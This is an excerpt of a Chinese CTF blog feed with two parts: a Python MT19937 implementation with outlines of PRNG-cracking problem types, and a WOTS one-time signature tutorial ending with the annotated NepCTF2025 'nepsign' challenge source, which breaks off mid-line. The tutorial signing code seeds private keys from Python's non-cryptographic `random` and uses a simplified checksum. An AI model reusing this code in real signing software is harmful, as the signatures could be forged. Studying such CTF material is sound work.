(self.mt[i-<span class="number">1</span>] ^ self.mt[i-<span class="number">1</span>] &gt;&gt; <span class="number">30</span>) + i)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getrandbits</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        1.这个步骤就是利用之前生成的624个初始状态寄存器的值,通过梅森旋转以及位运算</span></span><br><span class="line"><span class="string">          从而计算出这一次触发时我们得到的伪随机数的值</span></span><br><span class="line"><span class="string">        2.mti其实这里就是记录用户获取随机数的此时,以624为一个周期,每获取一个周期后就会触发梅森旋转(也被称为回火策略)</span></span><br><span class="line"><span class="string">        3.一开始mti为0的时候就会先触发一次梅森旋转</span></span><br><span class="line"><span class="string">        4. 2636928640(即0x9D2C5680)和4022730752(即0xEFC60000)都是常量。前者混合中位，掩盖模式特征;后者混合高位，增强熵</span></span><br><span class="line"><span class="string">        5. 这些常数保证了输出的质量和周期长度,并不能随意修改</span></span><br><span class="line"><span class="string">        :return: 返回值就是一个32位的整数</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> self.mti &gt;= <span class="number">624</span>:</span><br><span class="line">            self.twist()</span><br><span class="line">        y = self.mt[self.mti]</span><br><span class="line">        y ^= (y &gt;&gt; <span class="number">11</span>)</span><br><span class="line">        y ^= (y &lt;&lt; <span class="number">7</span>) &amp; <span class="number">0x9D2C5680</span></span><br><span class="line">        y ^= (y &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xEFC60000</span></span><br><span class="line">        y ^= (y &gt;&gt; <span class="number">18</span>)</span><br><span class="line">        self.mti = (self.mti + <span class="number">1</span>) % <span class="number">624</span></span><br><span class="line">        <span class="keyword">return</span> _int32(y)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">twist</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        直接将624个初始状态寄存器进行一个梅森旋转操作，</span></span><br><span class="line"><span class="string">        旋转过程涉及位运算以及与当前初始状态寄存器i以及第i+397个寄存器的状态有关</span></span><br><span class="line"><span class="string">        :return: 无返回值</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">624</span>):</span><br><span class="line">            <span class="comment"># 主要就是与一个固定的0x80000000 和 0x7fffffff</span></span><br><span class="line">            <span class="comment"># 这里就表示用第i个初始状态寄存器的最高位 + 第i+1个初始状态寄存器的第1-31位</span></span><br><span class="line">            y = _int32(((self.mt[i]) &amp; <span class="number">0x80000000</span>) + (self.mt[(i + <span class="number">1</span>) % <span class="number">624</span>] &amp; <span class="number">0x7fffffff</span>))</span><br><span class="line">            <span class="comment"># 之后就是更新当前初始状态寄存器的的值</span></span><br><span class="line">            self.mt[i] = _int32((y &gt;&gt; <span class="number">1</span>) ^ self.mt[(i+<span class="number">397</span>) % <span class="number">624</span>])</span><br><span class="line">            <span class="keyword">if</span> y % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">                self.mt[i] = self.mt[i] ^ <span class="number">0x9908b0df</span></span><br><span class="line">        self.mti = <span class="number">0</span></span><br><span class="line">mt = MT19937(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(mt.getrandbits())</span><br><span class="line"><span class="comment"># 2357136044</span></span><br></pre></td></tr></table></figure><h1 id="mt19937破解">MT19937破解</h1><ul><li>这一部分是参考：<a href="https://hasegawaazusa.github.io/mersenne-twister-note.html">Mersenne Twister 梅森旋转算法笔记 | 独奏の小屋</a></li></ul><h2 id="状态破解">状态破解</h2><h2 id="矩阵状态破解">矩阵状态破解</h2><h2 id="旋转破解">旋转破解</h2><h1 id="mt19937常见题型">MT19937常见题型</h1><ul><li>这一部分主要是参考：<a href="https://huangx607087.online/2021/07/10/Explore-MT19937/">https://huangx607087.online/2021/07/10/Explore-MT19937/</a></li><li>由于初始状态寄存器一共有<code>624*32=19968个bit位</code>，所以要恢复、预测等需要<code>19968</code>个bit位，所以在<code>MT19937</code>的题型都是围绕着已知<code>bit</code>位来实现的。</li></ul><h2 id="题型1_预测随机数">题型1_预测随机数</h2><ul><li>给了足够多的数据后其实可以预测随机数的，并且有在Python中其实有现成的库可以使用，当然其实也可以自己逆向以下<code>MT19937</code>的算法，自己预测破解。</li></ul><h3 id="题目1_xyctf2025_division">题目1_XYCTF2025_Division</h3><h3 id="题目2_">题目2_</h3><h2 id="题型2_恢复随机数">题型2_恢复随机数</h2><ul><li>这类题型其实就是选用一开始生成的随机数对<code>flag</code>等密文进行加密，之后给你后续一大堆随机数，让你恢复出随机数种子和初始状态寄存器</li><li>恢复出随机数种子和初始状态寄存器，从而可以得到一开始生成的随机数值，从而获得密钥，对<code>flag</code>的密文进行解密操作。</li></ul><h3 id="题目1_xyctf2025_choice">题目1_XYCTF2025_choice</h3><h2 id="题型3_给一定量任意的bit">题型3_给一定量任意的bit</h2><ul><li>这种情况是题目给你一定量<code>任意的伪随机数的bit</code>，从而让你恢复这个伪随机数。这种情况其实就是要进行一定量的操作了。</li><li>有些情况他会给你足够的<code>bit</code>也就是<code>19968</code>个<code>bit</code>或者超过<code>19968个</code>bit，此时还是比较好恢复初始状态寄存器的。</li><li>但是有些情况题目不会给你足够数量的<code>bit</code>位，此时可能就需要对<code>MT19937</code>的旋转过程或者其他过程进行破解。从而恢复初始状态寄存器。</li></ul><h3 id="题目1_random-game">题目1_Random game</h3><h3 id="题目2_never-enough">题目2_never enough</h3><h1 id="相关库分析">相关库分析</h1><h2 id="python中random库">python中random库</h2><h2 id="c中stdmt19937_64">C++中std::mt19937_64</h2>]]></content>
    
    
    <summary type="html">前言：学习一下比较常用的MT19937</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="CRYPTO" scheme="http://iyheart.github.io/categories/CTF/CRYPTO/"/>
    
    <category term="伪随机数" scheme="http://iyheart.github.io/categories/CTF/CRYPTO/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>一次性签名-WOTS</title>
    <link href="http://iyheart.github.io/2025/08/31/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/%E4%B8%80%E6%AC%A1%E6%80%A7%E7%AD%BE%E5%90%8D-WOTS/"/>
    <id>http://iyheart.github.io/2025/08/31/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/%E4%B8%80%E6%AC%A1%E6%80%A7%E7%AD%BE%E5%90%8D-WOTS/</id>
    <published>2025-08-31T08:06:07.000Z</published>
    <updated>2025-09-01T14:59:56.250Z</updated>
    
    <content type="html"><![CDATA[<ul><li>参考文章：<a href="https://mp.weixin.qq.com/s/9ik2fPXH3OP1q7SrH-wLZw">https://mp.weixin.qq.com/s/9ik2fPXH3OP1q7SrH-wLZw</a></li></ul><h1 id="wots介绍">WOTS介绍</h1><ul><li><code>WOTS</code>全称为<code>Winternitz one-time signature scheme</code>，翻译过来就被叫做<code>Winternitz 一次性签名方案</code>，该数字签名为<code>Robert Winternitz</code>提出的。</li><li><code>WOTS</code>这个数字签名是<strong>基于哈希的签名算法</strong>，该签名是<code>Lamport</code>签名的改进算法，通过时间换空间的思路，减少了签名的体积。</li><li>应用场景：<ul><li>作为<code>XMSS</code>、<code>SPHINCS</code>等现代化哈希签名体系的核心组件。</li><li>适合在抗练字密码学中作为安全的签名方案</li><li>由于<code>WOTS</code>是一次性签名，通常配合<code>Merkle</code>树扩展成多次使用的签名体系。</li></ul></li></ul><h1 id="wots算法过程">WOTS算法过程</h1><ul><li>对于这个算法来说，主要包括的还是密钥生成、签名、数字签名的验证三个算法，所以<code>WOTS</code>算法过程主要就是分为<code>密钥生成</code>、<code>签名</code>、<code>数字签名的验证</code>三个过程</li><li>注意：这个数字签名算法需要多看几遍才能看明白，而且第一次看的时候会有点懵，需要从整体把握这样才能明白每一步为什么要这样选取数据。</li></ul><h2 id="密钥生成">密钥生成</h2><p><strong>确定同时签名的位数</strong>：首先需要先选取一个$\omega\ge2$，$\omega$表示要<strong>同时签名的位数</strong>，并且还控制着公钥的<strong>哈希次数</strong>。</p><ul><li>这里例举一个例子帮助理解：比如：要签名<code>a-&gt;01100001</code>，如果选取$w=2$，那么签名的时候对于<code>a-&gt;01100001</code>就会将它的二进制位，按照俩个一组进行组合，将组合后的数据进行哈希计算<code>h(01)、h(10)、h(00)、h(01)</code>。</li><li>注意：一般来说$\omega=8$，因为<code>8</code>位是一个字节刚好可以一个字节同时进行数字签名。</li></ul><p><strong>选取一个哈希函数</strong>：确定哈希函数的消息摘要长度是<code>256</code>位，还是<code>128</code>位将会影响后续公钥和私钥的长度。这边选取目前最常用的<code>sha2-256</code>。即哈希摘要长度为<code>256</code>位，转换为字节数就是<code>32</code>字节。</p><p><strong>私钥的选取</strong>：要确定私钥的个数，私钥的大小。</p><ul><li><p>私钥的个数由俩个部分组成：</p><ul><li><p>第一个部分$t_1$：由同时签名的位数$\omega$与哈希函数的消息摘要长度决定，即哈希摘要的位数$256/\omega$，这里$t_1=32$</p></li><li><p>第二个部分$t_2$：由同时签名的位数$\omega$与后面校验和的长度决定，根据下面的校验和长度，选择$t_2=2$</p></li></ul></li><li><p>私钥的生成的大小其实就是在$x_i\in[0,2^{256}),i=1,2,…,t-1$这个范围内，而这个<code>256</code>其实就是选取哈希函数消息摘要的位数。这样就形成了一个私钥。</p></li></ul><p>$$<br>Sk=(x_{t-1},…,x_1,x_0),t=t_1+t_2<br>$$</p><p><strong>公钥的计算</strong>：公钥的计算其实比较简单，就是将私钥进行一定次数的哈希计算，形成哈希链。而哈希的次数是由$\omega$决定的。<br>$$<br>y_i=h^{2^{\omega}-1}(x_i)=h^{256}(x_i),0\le i \le t-1\<br>Pk=(y_{t-1},…,y_1,y_0)<br>$$</p><ul><li>由于$\omega=8$，哈希的次数为<code>255</code>，哈希的次数比较合适（太多会导致运算时间太高，太少导致容易被破解）。</li></ul><h2 id="签名">签名</h2><ul><li>假设消息是<code>m</code>，首先需要通过一次哈希，将消息<code>m</code>映射到固定的长度，这里选取<code>sha2-256</code>，所以消息<code>m</code>会被映射成<code>256</code>位。接下来就需要对这个<code>256</code>位的哈希值进行分组操作，将这个<code>256</code>位的哈希值分成$\omega$位一组，这里也就是<code>8</code>位一组。</li></ul><p>$$<br>h(m) = b_{t_1-1}||…||b_0<br>$$</p><ul><li>接下来需要对分组的$b_i$计算一个校验和，具体的计算方式如下：</li></ul><p>$$<br>c = \sum_{i=0}^{t_1-1}(2^{\omega}-b_i)<br>$$</p><ul><li>求得校验和<code>c</code>后，需要将<code>c</code>转换为比特串，将转换成的比特串继续按照$\omega$位一组进行分组，一共可以分得$t_2$组，而这个$t_2$就是前面私钥的个数$t=t_1+t_2$中的$t_2$，而通过计算这里的$t_2=2$</li></ul><p>$$<br>c=b_{t_2-1}||…||b_0<br>$$</p><ul><li>这里将<code>h(m)</code>和<code>c</code>组合起来得到<code>d</code>：</li></ul><p>$$<br>d=c||h(m)=d_{t-1}||…||d_{t-t_2-1}||…d_0<br>$$</p><ul><li>最终就需要对消息的哈希值与校验和进行签名得到最终的签名<code>V</code>，最坏的情况需要执行$2^{\omega-1}$次的哈希函数运算：</li></ul><p>$$<br>v_i =h^{d_i}(sk_i),i=0,1,…,t-1\<br>V = (v_{t-1},…,t_1,t_0)<br>$$</p><h2 id="验签算法">验签算法</h2><ul><li>验证签名的运算其实就是将哈希链的计算次数达到<code>255</code>次并判断是否与公钥相等。也就是先进行哈希函数的运算：</li></ul><p>$$<br>v’<em>i = h^{255-d_i}(v_i)\<br>V’=(v’</em>{t-1},…,v’_{1},v’_0)<br>$$</p><ul><li>最后判断$pk_i$是否与$v’_i$相等，如果存在有一个数据不相等就说明签名验证不成功，说明消息或者某些数据被更改了。</li></ul><p>注意：这是一次性数字签名方案，说明如果重复使用同一个私钥对不同消息进行数字签名，很可能就能伪造数字签名了。所以一次性数字签名在可能会存在<strong>重复使用私钥的情况</strong>。</p><h2 id="代码实现">代码实现</h2><ul><li>实现的代码如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="comment"># 使用sha2-256进行哈希链的计算</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hash_chain</span>(<span class="params">m,x</span>):</span><br><span class="line">    t = m</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(x):</span><br><span class="line">        t = sha256(t).digest()</span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建公钥和私钥</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">key_gen</span>():</span><br><span class="line">    omega,t1,t2 = <span class="number">8</span>, <span class="number">32</span>, <span class="number">2</span></span><br><span class="line">    sk = [random.randint(<span class="number">0</span>,<span class="number">2</span>**(omega * <span class="number">32</span>)) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(t1+t2)] <span class="comment"># 生成私钥</span></span><br><span class="line">    pk = [hash_chain(long_to_bytes(m),<span class="number">255</span>) <span class="keyword">for</span> m <span class="keyword">in</span> sk] <span class="comment"># 生成公钥</span></span><br><span class="line">    <span class="keyword">return</span> sk,pk</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进行签名操作m表示需要签名的消息,sk表示用于签名的私钥</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">m,sk</span>):</span><br><span class="line">    <span class="comment"># 计算消息的哈希值</span></span><br><span class="line">    m_ = sha256(m).digest()</span><br><span class="line">    <span class="comment"># V用于存储签名的结果</span></span><br><span class="line">    V = []</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 签名消息</span></span><br><span class="line">    <span class="keyword">for</span> index, item <span class="keyword">in</span> <span class="built_in">enumerate</span>(m_):</span><br><span class="line">        V.append(hash_chain(long_to_bytes(sk[index]),item))</span><br><span class="line">    sigma = long_to_bytes(<span class="built_in">sum</span>(<span class="built_in">list</span>(m_)))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 签名校验和</span></span><br><span class="line">    <span class="keyword">for</span> index, item <span class="keyword">in</span> <span class="built_in">enumerate</span>(sigma):</span><br><span class="line">        V.append(hash_chain(long_to_bytes(sk[index+<span class="number">32</span>]),item))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> V</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进行数字签名的验证</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">m,V,pk</span>):</span><br><span class="line">    m_ = sha256(m).digest()</span><br><span class="line">    V_ = []</span><br><span class="line">    <span class="comment"># 计算剩余的哈希链</span></span><br><span class="line">    <span class="keyword">for</span> index, item <span class="keyword">in</span> <span class="built_in">enumerate</span>(m_):</span><br><span class="line">        V_.append(hash_chain(V[index],<span class="number">255</span>-item))</span><br><span class="line"></span><br><span class="line">    c = long_to_bytes(<span class="built_in">sum</span>(<span class="built_in">list</span>(m_)))</span><br><span class="line">    <span class="comment"># 计算校验和部分的剩余哈希链</span></span><br><span class="line">    <span class="keyword">for</span> index,item <span class="keyword">in</span> <span class="built_in">enumerate</span>(c):</span><br><span class="line">        V_.append(hash_chain(V[index+<span class="number">32</span>],<span class="number">255</span>-item))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 判断计算出来的哈希链是否与公钥pk相等</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(V_)):</span><br><span class="line">        <span class="keyword">if</span> pk[i] != V_[i]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    sk, pk = key_gen()</span><br><span class="line">    m = <span class="string">b&#x27;AAAA&#x27;</span></span><br><span class="line">    V = sign(m,sk)</span><br><span class="line">    <span class="comment"># 当 m 没被修改时进行认证</span></span><br><span class="line">    result = verify(m,V,pk)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;m没被修改=<span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="comment"># 当 m 被修改过时进行认证</span></span><br><span class="line">    result2 = verify(<span class="string">b&#x27;AAA&#x27;</span>,V,pk)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;m被修改过进行认证=<span class="subst">&#123;result2&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="例题-nepctf2025_nepsign">例题-nepctf2025_nepsign</h1><ul><li>题目附件如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmssl <span class="keyword">import</span> sm3</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> SystemRandom</span><br><span class="line"><span class="keyword">from</span> ast <span class="keyword">import</span> literal_eval</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">flag = os.environ[<span class="string">&quot;FLAG&quot;</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SM3</span>(<span class="params">data</span>):</span><br><span class="line">    d = [i <span class="keyword">for</span> i <span class="keyword">in</span> data]</span><br><span class="line">    h = sm3.sm3_hash(d)  </span><br><span class="line">    <span class="keyword">return</span> h</span><br><span class="line"></span><br><span class="line"><span class="comment"># SM3和SM3_n是一块的,实现的就是哈希值计算,所以此题使用的就是SM3作为哈希函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SM3_n</span>(<span class="params">data, n=<span class="number">1</span>, bits=<span class="number">256</span></span>):</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        data = <span class="built_in">bytes</span>.fromhex(SM3(data))</span><br><span class="line">    <span class="keyword">return</span> data.<span class="built_in">hex</span>()[:bits // <span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Nepsign</span>():</span><br><span class="line">    <span class="comment"># 构造方法, 初始化n = 256 , hex_symbols = &#x27;012....&#x27; ,调用keygen函数</span></span><br><span class="line">    <span class="comment"># 从sign()函数中可以看出,omega = 8</span></span><br><span class="line">    <span class="comment"># 从公钥的生成可以看出哈希链也是哈希了255次</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>): </span><br><span class="line">        self.n = <span class="number">256</span></span><br><span class="line">        self.hex_symbols = <span class="string">&#x27;0123456789abcdef&#x27;</span></span><br><span class="line">        self.keygen()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 密钥生成方式类似于WOTS(Winternitz one-time signature scheme)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">keygen</span>(<span class="params">self</span>): </span><br><span class="line">        rng = SystemRandom()   </span><br><span class="line">        self.sk = [rng.randbytes(<span class="number">32</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>)]   <span class="comment"># 生成私钥sk,生成48组</span></span><br><span class="line">        self.pk = [SM3_n(self.sk[_], <span class="number">255</span>, self.n) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>)] <span class="comment"># 生成公钥pk,生成48组</span></span><br><span class="line">        <span class="keyword">return</span> self.sk, self.pk <span class="comment"># 返回数据及其哈希值</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">self, msg, sk=<span class="literal">None</span></span>): <span class="comment"># 签名操作</span></span><br><span class="line">        sk = sk <span class="keyword">if</span> sk <span class="keyword">else</span> self.sk  <span class="comment"># 获取私钥</span></span><br><span class="line">        m = SM3(msg) <span class="comment"># 计算消息msg的哈希值,结果为m</span></span><br><span class="line">        m_bin = <span class="built_in">bin</span>(<span class="built_in">int</span>(m, <span class="number">16</span>))[<span class="number">2</span>:].zfill(<span class="number">256</span>) <span class="comment"># 将哈希值转换为二进制比特填充,填充到256位</span></span><br><span class="line">        a = [<span class="built_in">int</span>(m_bin[<span class="number">8</span> * i: <span class="number">8</span> * i + <span class="number">8</span>], <span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.n // <span class="number">8</span>)] <span class="comment"># 8位一组,8位一组的取出来</span></span><br><span class="line">        step = [<span class="number">0</span>] * <span class="number">48</span> <span class="comment"># 初始化,保存a数组的值</span></span><br><span class="line">        qq = [<span class="number">0</span>] * <span class="number">48</span> <span class="comment"># 初始化,保存hash值</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):<span class="comment"># 计算哈希链,哈希次数为step[i],哈希的数据为sk[i]</span></span><br><span class="line">            step[i] = a[i]</span><br><span class="line">            qq[i] = SM3_n(sk[i], step[i]) </span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 这里相当于自定义了一个校验和,这个校验和是统计m消息的哈希值的16进制字符表示中0~f的索引和</span></span><br><span class="line">        <span class="comment"># 比如m[0]=&#x27;0&#x27;,m[16]=&#x27;0&#x27;,那么sum[0] = 0 + 16</span></span><br><span class="line">        <span class="built_in">sum</span> = [<span class="number">0</span>] * <span class="number">16</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">            <span class="built_in">sum</span>[i] = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">65</span>):</span><br><span class="line">                <span class="keyword">if</span> m[j - <span class="number">1</span>] == self.hex_symbols[i]: </span><br><span class="line">                    <span class="built_in">sum</span>[i] += j     </span><br><span class="line">            step[i + <span class="number">32</span>] = <span class="built_in">sum</span>[i] % <span class="number">255</span>  <span class="comment"># 将sum[i]模上255</span></span><br><span class="line">            qq[i + <span class="number">32</span>] = SM3_n(sk[i + <span class="number">32</span>], step[i + <span class="number">32</span>]) <span class="comment"># 计算校验和部分的哈希链</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> [i <span class="keyword">for</span> i <span class="keyword">in</span> qq] <span class="comment"># 相当于返回qq列表,qq列表长度为</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">self, msg, qq, pk=<span class="literal">None</span></span>): <span class="comment"># 验证过程</span></span><br><span class="line">        qq = [<span class="built_in">bytes</span>.fromhex(i) <span class="keyword">for</span> i <span class="keyword">in</span> qq] <span class="comment">#</span></span><br><span class="line">        pk = pk <span class="keyword">if</span> pk <span class="keyword">else</span> self.pk</span><br><span class="line">        m = SM3(msg)</span><br><span class="line">        m_bin = <span class="built_in">bin</span>(<span class="built_in">int</span>(m, <span class="number">16</span>))[<span class="number">2</span>:].zfill(<span class="number">256</span>)</span><br><span class="line">        a = [<span class="built_in">int</span>(m_bin[<span class="number">8</span> * i: <span class="number">8</span> * i + <span class="number">8</span>], <span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.n // <span class="number">8</span>)]</span><br><span class="line">        step = [<span class="number">0</span>] * <span class="number">48</span></span><br><span class="line">        pk_ = [<span class="number">0</span>] * <span class="number">48</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">            step[i] = a[i]</span><br><span class="line">            pk_[i] = SM3_n(qq[i], <span class="number">255</span> - step[i]) <span class="comment"># 关键点一共会进行255次哈希,抓住这一点去伪造qq</span></span><br><span class="line">        <span class="built_in">sum</span> = [<span class="number">0</span>] * <span class="number">16</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">            <span class="built_in">sum</span>[i] = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">65</span>):</span><br><span class="line">                <span class="keyword">if</span> m[j - <span class="number">1</span>] == self.hex_symbols[i]:</span><br><span class="line">                    <span class="built_in">sum</span>[i] += j</span><br><span class="line">            step[i + <span class="number">32</span>] = <span class="built_in">sum</span>[i] % <span class="number">255</span></span><br><span class="line">            pk_[i + <span class="number">32</span>] = SM3_n(qq[i + <span class="number">32</span>], <span class="number">255</span> - step[i + <span class="number">32</span>])</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span> <span class="keyword">if</span> pk_ == pk <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;initializing...&#x27;</span>)</span><br><span class="line">Sign = Nepsign()</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">match</span> <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>)): <span class="comment"># 提供俩个选项</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>: <span class="comment"># 选项1是输入消息,消息不等于happy for NepCTF 2025就会对输入的消息进行签名,但是这里存在一个私钥复用的漏洞点,通过特殊构造其实就可以得到qq列表</span></span><br><span class="line">            msg = <span class="built_in">bytes</span>.fromhex(<span class="built_in">input</span>(<span class="string">&#x27;msg: 